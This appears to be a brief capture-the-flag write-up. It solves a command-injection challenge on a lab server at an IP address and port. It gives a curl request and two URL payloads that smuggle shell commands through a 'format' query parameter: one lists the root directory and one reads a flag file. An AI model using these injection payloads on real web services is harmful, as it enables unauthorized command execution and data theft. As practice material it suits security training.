    curl "94.237.60.55:39212?format=123'; echo 'test';"


It's command injection. Should be trivial.

    http://94.237.60.55:39212/?format=%27;ls%20/%27
    
    http://94.237.60.55:39212/?format=%27;cat ../flag%27
        
            
